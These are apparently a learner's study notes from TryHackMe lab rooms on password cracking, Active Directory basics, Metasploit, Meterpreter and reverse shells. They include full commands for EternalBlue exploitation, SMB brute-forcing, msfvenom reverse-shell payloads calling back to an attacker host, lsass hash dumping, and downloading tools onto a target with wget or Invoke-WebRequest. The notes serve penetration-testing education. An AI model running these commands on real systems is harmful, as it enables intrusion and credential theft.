<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john secure.zip &gt; yake.txt </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt yake.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rar2john secure.rar &gt; yake.txt</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt yake.txt</span><br><span class="line">unrar x secure.rar</span><br></pre></td></tr></table></figure>

<p><strong>ssh</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt; id_rsa_hash.txt</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt</span><br></pre></td></tr></table></figure>

<h3 id="Encyption-Crypto-101"><a href="#Encyption-Crypto-101" class="headerlink" title="Encyption-Crypto 101"></a>Encyption-Crypto 101</h3><p><strong>What is Key Exchange?</strong></p>
<p>Key exchange allows 2 people&#x2F;parties to establish a set of common cryptographic keys without an observer being able to get these keys. Generally, to establish common symmetric keys.</p>
<p><strong>How does Diffie Hellman Key Exchange work?</strong></p>
<p>Alice and Bob want to talk securely. They want to establish a common key, so they can use symmetric cryptography, but they don’t want to use key exchange with asymmetric cryptography. This is where DH Key Exchange comes in.</p>
<p>Alice and Bob both have secrets that they generate, let’s call these A and B. They also have some common material that’s public, let’s call this C.</p>
<p>We need to make some assumptions. Firstly, whenever we combine secrets&#x2F;material it’s impossible or very very difficult to separate. Secondly, the order that they’re combined in doesn’t matter.</p>
<p>Alice and Bob will combine their secrets with the common material, and form AC and BC. They will then send these to each other, and combine that with their secrets to form two identical keys, both ABC. Now they can use this key to communicate.</p>
<p><strong>Extra Resources</strong></p>
<p>An excellent video if you want a visual explanation is available here. <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=NmM9HA2MQGI">https://www.youtube.com/watch?v=NmM9HA2MQGI</a></p>
<p>DH Key Exchange is often used alongside RSA public key cryptography, to prove the identity of the person you’re talking to with digital signing. This prevents someone from attacking the connection with a man-in-the-middle attack by pretending to be Bob.</p>
<p>PGP stands for Pretty Good Privacy. It’s a software that implements encryption for encrypting files, performing digital signing and more.</p>
<p>If the key is passphrase protected, you can attempt to crack this passphrase using John The Ripper and gpg2john. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpg --import tryhackme.key</span><br><span class="line">gpg message.gpg</span><br><span class="line">cat message </span><br></pre></td></tr></table></figure>

<h1 id="Windows-Exploitation-Basics"><a href="#Windows-Exploitation-Basics" class="headerlink" title="Windows Exploitation Basics"></a>Windows Exploitation Basics</h1><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>win+r          MSConfig  is the most important.</p>
<ol>
<li>MSConfig      —&gt;      UAC (user account control)</li>
<li>taskmgr</li>
<li>conrtol.exe</li>
<li>compmgmt.msc     &#x2F;&#x2F;Computer Management</li>
<li>msinfo32                 &#x2F;&#x2F;system info</li>
<li>resmon                    &#x2F;&#x2F; Resource Monitor</li>
<li>regedit</li>
<li>WF.msc                    &#x2F;&#x2F;windows defender</li>
</ol>
<h3 id="Active-Directory-Basics"><a href="#Active-Directory-Basics" class="headerlink" title="Active Directory Basics"></a>Active Directory Basics</h3><p>Simply put, a <strong>Windows domain</strong> is a group of users and computers under the administration of a given business. The main idea behind a domain is to centralise the administration of common components of a Windows computer network in a single repository called <strong>Active Directory (AD)</strong>. The server that runs the Active Directory services is known as a <strong>Domain Controller (DC)</strong>.</p>
<p>Identifying machine accounts is relatively easy. They follow a specific naming scheme. The machine account name is the computer’s name followed by a dollar sign. For example, a machine named <code>DC01</code> will have a machine account called <code>DC01$</code>.</p>
<p>Several groups are created by default in a domain that can be used to grant specific privileges to users. As an example, here are some of the most important groups in a domain:</p>
<table>
<thead>
<tr>
<th><strong>Security Group</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Domain Admins</td>
<td>Users of this group have administrative privileges over the entire domain. By default, they can administer any computer on the domain, including the DCs.</td>
</tr>
<tr>
<td>Server Operators</td>
<td>Users in this group can administer Domain Controllers. They cannot change any administrative group memberships.</td>
</tr>
<tr>
<td>Backup Operators</td>
<td>Users in this group are allowed to access any file, ignoring their permissions. They are used to perform backups of data on computers.</td>
</tr>
<tr>
<td>Account Operators</td>
<td>Users in this group can create or modify other accounts in the domain.</td>
</tr>
<tr>
<td>Domain Users</td>
<td>Includes all existing user accounts in the domain.</td>
</tr>
<tr>
<td>Domain Computers</td>
<td>Includes all existing computers in the domain.</td>
</tr>
<tr>
<td>Domain Controllers</td>
<td>Includes all existing DCs on the domain.</td>
</tr>
</tbody></table>
<p>Security Groups vs OUs</p>
<p>You are probably wondering why we have both groups and OUs. While both are used to classify users and computers, their purposes are entirely different:</p>
<ul>
<li><strong>OUs</strong> are handy for <strong>applying policies</strong> to users and computers, which include specific configurations that pertain to sets of users depending on their particular role in the enterprise. Remember, a user can only be a member of a single OU at a time, as it wouldn’t make sense to try to apply two different sets of policies to a single user.</li>
<li><strong>Security Groups</strong>, on the other hand, are used to <strong>grant permissions over resources</strong>. For example, you will use groups if you want to allow some users to access a shared folder or network printer. A user can be a part of many groups, which is needed to grant access to multiple resources.</li>
</ul>
<p>Which group normally administrates all computers and resources in a domain?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Domain Admins</span><br></pre></td></tr></table></figure>

<p>What would be the name of the machine account associated with a machine named TOM-PC?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TOM-PC$</span><br></pre></td></tr></table></figure>

<p>Suppose our company creates a new department for Quality Assurance. What type of containers should we use to group all Quality Assurance users so that policies can be applied consistently to them?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Organizational Units</span><br></pre></td></tr></table></figure>



<p><strong>Deleting extra OUs and users</strong></p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221130151457837.png" alt="image-20221130151457837"></p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221130151551014.png" alt="image-20221130151551014"></p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221130151603852.png" alt="image-20221130151603852"></p>
<p><strong>Delegation</strong></p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221130151701859.png" alt="image-20221130151701859"></p>
<p>The process of granting privileges to a user over some OU or other AD Object is called…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Delegation</span><br></pre></td></tr></table></figure>

<p>ummmmmmmm………….maybe you can read this blog : <a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/16749328.html">https://www.cnblogs.com/Hekeats-L/p/16749328.html</a></p>
<p>okay.</p>
<p>When using Windows domains, all credentials are stored in the Domain Controllers. Whenever a user tries to authenticate to a service using domain credentials, the service will need to ask the Domain Controller to verify if they are correct. Two protocols can be used for network authentication in windows domains:</p>
<ul>
<li><strong>Kerberos:</strong> Used by any recent version of Windows. This is the default protocol in any recent domain.</li>
<li><strong>NetNTLM:</strong> Legacy authentication protocol kept for compatibility purposes.</li>
</ul>
<p>While NetNTLM should be considered obsolete, most networks will have both protocols enabled.</p>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/winadbasics">https://tryhackme.com/room/winadbasics</a></p>
<p>Keep in mind that this room should only serve as an introduction to the basic concepts, as there’s quite a bit more to explore to implement a production-ready Active Directory environment.</p>
<p>A month later , I will learn <a target="_blank" rel="noopener" href="https://tryhackme.com/module/hacking-active-directory">https://tryhackme.com/module/hacking-active-directory</a>.</p>
<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><h3 id="Metasploit-Introduction"><a href="#Metasploit-Introduction" class="headerlink" title="Metasploit : Introduction"></a>Metasploit : Introduction</h3><p>The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.</p>
<p><strong>Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.</strong></p>
<p><strong>Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.</strong></p>
<p><strong>Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.</strong></p>
<p><strong>Exploits: Exploits, neatly organized by target system.</strong></p>
<p>**NOPs: NOPs (No OPeration) do nothing, literally. **: They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.</p>
<p><strong>Payloads: Payloads are codes that will run on the target system.</strong></p>
<ol>
<li><strong>Singles:</strong> Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.</li>
<li><strong>tagers:</strong> Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.</li>
<li><strong>Stages:</strong> Downloaded by the stager. This will allow you to use larger sized payloads.</li>
</ol>
<p><strong>Post:</strong> Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms17_010_eternalblue</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">info</span><br><span class="line">show options</span><br><span class="line">set rhosts 127.0.0.1        //setg -- set default value       unsetg   unset     unset payload</span><br><span class="line">run</span><br><span class="line">back</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run = exploit</span><br><span class="line">exploit -z      //run the exploit and background the session as soon as it opens.</span><br></pre></td></tr></table></figure>

<p>Some modules support the <code>check</code> option. This will check if the target system is vulnerable without exploiting it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check</span><br></pre></td></tr></table></figure>

<p><strong>Sessions</strong><br>Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit.</p>
<p>You can use the <code>background</code> command to background the session prompt and go back to the msfconsole prompt.</p>
<p>The <code>sessions</code> command can be used from the msfconsole prompt or any context to see the existing sessions.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background               //CTRL+Z</span><br><span class="line">sessions</span><br><span class="line">sessions -i number</span><br></pre></td></tr></table></figure>

<h3 id="Metasploit-Exploitation"><a href="#Metasploit-Exploitation" class="headerlink" title="Metasploit : Exploitation"></a>Metasploit : Exploitation</h3><p>Please note that for all questions that require using a wordlist (e.g brute-force attacks), we will be using the wordlist on the AttackBox found at the following path:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br></pre></td></tr></table></figure>

<p>You can directly perform Nmap scans from the msfconsole prompt as shown below faster:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 10.10.219.231</span><br></pre></td></tr></table></figure>

<p><strong>UDP service Identification</strong></p>
<p>The <code>scanner/discovery/udp_sweep</code> module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as <strong>DNS or NetBIOS.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>

<p><strong>SMB Scans</strong></p>
<p>Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be <code>smb_enumshares</code> and <code>smb_version</code> but please spend some time to identify scanners that the Metasploit version installed on your system offers.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- -T4 --min-rate=9326 -vv IP</span><br><span class="line">search smb_login</span><br><span class="line">use 0</span><br><span class="line">set rhosts 10.10.219.231</span><br><span class="line">set smbuser penny</span><br><span class="line">set pass_file /usr/share/wordlistss/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><strong>The metasploit Database</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start postgresql</span><br><span class="line">msfdb init</span><br><span class="line">msfconsole</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>

<p>The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the <code>workspace</code> command. </p>
<p>You can add a workspace using the <code>-a</code> parameter or delete a workspace using the <code>-d</code> parameter, respectively. The screenshot below shows that a new workspace named “tryhackme” was created.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">workspace -a trya</span><br><span class="line">workspace</span><br><span class="line">workspace trya </span><br><span class="line">worksapce -h</span><br><span class="line">worksapce -d trya</span><br></pre></td></tr></table></figure>

<p>If you run a Nmap scan using the <code>db_nmap</code> shown below, all results will be saved to the database. </p>
<p>You can now reach information relevant to hosts and services running on target systems with the <code>hosts</code> and <code>services</code> commands, respectively. </p>
<p>Once the host information is stored in the database, you can use the <code>hosts -R</code> command to add this value to the RHOSTS parameter. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services -S netbios  </span><br></pre></td></tr></table></figure>

<p><strong>Msfvenom</strong></p>
<p>Msfvenom will allow you to access all payloads available in the Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads</span><br><span class="line">msfvenom --list formats</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64     //the output format was raw    -e  --&gt;encoding</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php</span><br></pre></td></tr></table></figure>

<p>Please note: The output PHP file will miss the starting PHP tag commented and the end tag (<code>?&gt;</code>), as seen below.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</span><br><span class="line"></span><br><span class="line">PHP</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</span><br><span class="line"></span><br><span class="line">ASP</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</span><br><span class="line"></span><br><span class="line">Python</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/linux/gather/hashdump       //hashdump</span><br></pre></td></tr></table></figure>



<h3 id="Metasploit-Meterpreter"><a href="#Metasploit-Meterpreter" class="headerlink" title="Metasploit : Meterpreter"></a>Metasploit : Meterpreter</h3><p><strong>How does Meterpreter work?</strong></p>
<p>Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list payloads | meterpreter</span><br></pre></td></tr></table></figure>

<p>Your decision on which version of Meterpreter to use will be mostly based on three factors;</p>
<ul>
<li>The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)</li>
<li>Components available on the target system (Is Python installed? Is this a PHP website? etc.)</li>
<li>Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">show payloads </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">help</span><br><span class="line">migrate           //keyscan_start, keyscan_stop and keyscan_dump</span><br><span class="line">hashdump</span><br><span class="line">search</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>


<p>What is the computer name?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>

<p>What is the target domain?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>

<p>What is the name of the share likely created by the user?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">speedster  //run this post exploit post/windows/gather/enum_shares</span><br></pre></td></tr></table></figure>

<p>What is the NTLM hash of the jchambers user?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//ps | grep lsass</span><br></pre></td></tr></table></figure>

<p>What is the cleartext password of the jchambers user?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You will need to migrate to the &quot;lsass.exe&quot; process first</span><br><span class="line">ps | grep lsass  //to find the PID</span><br><span class="line">migrate pid</span><br><span class="line">hashdump</span><br><span class="line">goto crackstation.net and find the password</span><br></pre></td></tr></table></figure>

<blockquote>
<p>　lsass.exe是系统进程，用于本地安全认证服务器，她为winlogon服务的用户验证生成一个进程。如果身份验证成功，Lsass将生成用户的访问令牌，用于启动初始外壳程序。该用户启动的其他进程将继承这一令牌。</p>
</blockquote>
<p>Where is the “secrets.txt” file located?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search -f *.txt</span><br></pre></td></tr></table></figure>

<h3 id="BLUE"><a href="#BLUE" class="headerlink" title="BLUE"></a>BLUE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- -T5 -vv 10.10.13.228</span><br><span class="line">search ms17_010</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set lhost 10.14.37.196</span><br><span class="line">set rhosts 10.10.13.228</span><br><span class="line">run</span><br><span class="line">sessions -u 1 //ost/multi/manage/shell_to_meterpreter</span><br><span class="line">sessions -i 2</span><br></pre></td></tr></table></figure>

<h1 id="Shells-and-Privilege-Escalation"><a href="#Shells-and-Privilege-Escalation" class="headerlink" title="Shells and Privilege Escalation"></a>Shells and Privilege Escalation</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11664">https://xz.aliyun.com/t/11664</a></p>
<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p><strong>Netcat:</strong></p>
<p>etcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.</p>
<p><strong>Socat:</strong></p>
<p>Socat is like netcat on steroids. It can do all of the same things, and <em>many</em> more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:</p>
<ol>
<li>The syntax is more difficult</li>
<li>Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.</li>
</ol>
<p><strong>Metasploit – multi&#x2F;handler:</strong></p>
<p>The <code>auxiliary/multi/handler</code> module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. </p>
<p><strong>Msfvenom:</strong></p>
<p>Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/webshells</span><br></pre></td></tr></table></figure>



<p><strong>Interactive</strong></p>
<p><em>Interactive:</em> If you’ve used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to<br>interactive shells. These allow you to interact with programs after executing them. </p>
<p><strong>Non-Interactive</strong></p>
<p><em>Non-Interactive</em> shells don’t give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. </p>
<h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a><strong>Netcat</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port-number&gt;    //reverse shell</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>-l</strong> is used to tell netcat that this will be a listener</li>
<li><strong>-v</strong> is used to request a verbose output</li>
<li><strong>-n</strong> tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.</li>
<li><strong>-p</strong> indicates that the port specification will follow.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;target-ip&gt; &lt;chosen-port&gt;         //blind shell</span><br></pre></td></tr></table></figure>

<p>These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat “shells” really being processes running <em>inside</em> a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We’ll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we’ll be covering here is particularly useful for it.</p>
<p>Technique 1: Python</p>
<p>The first technique we’ll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:</p>
<ol>
<li>The first thing to do is use <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace <code>python</code> with <code>python2</code> or <code>python3</code> as required. At this point our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.</li>
<li>Step two is: <code>export TERM=xterm</code> – this will give us access to term commands such as <code>clear</code>.</li>
<li>Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use <code>stty raw -echo; fg</code>. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.</li>
</ol>
<p>Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type <code>reset</code> and press enter.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm</span><br><span class="line">Ctrl + Z</span><br><span class="line">stty raw -echo; fg</span><br><span class="line">whoami </span><br><span class="line">ssh shell @localhost</span><br></pre></td></tr></table></figure>

<p><em>Technique 2: rlwrap</em></p>
<p>rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell*;* however, s<em>ome</em> manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with <code>sudo apt install rlwrap</code>.</p>
<p>To use rlwrap, we invoke a slightly different listener:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install rlwrap</span><br><span class="line">rlwrap nc -lvnp &lt;port&gt;</span><br><span class="line">Ctrl + Z</span><br><span class="line">stty raw -echo; fg</span><br><span class="line">whoami </span><br><span class="line">ssh shell @localhost</span><br></pre></td></tr></table></figure>

<p>Prepending our netcat listener with “rlwrap” gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it’s possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use <code>stty raw -echo; fg</code> to stabilise and re-enter the shell.</p>
<p> <em>Technique 3: Socat</em></p>
<p>The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that <strong>this technique is limited to Linux targets</strong>, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">socat static compiled binary</a> (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (<code>sudo python3 -m http.server 80</code>), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>).</p>
<p>For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (<code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code>). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat           //linux</span><br><span class="line">Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe                    //windows</span><br></pre></td></tr></table></figure>



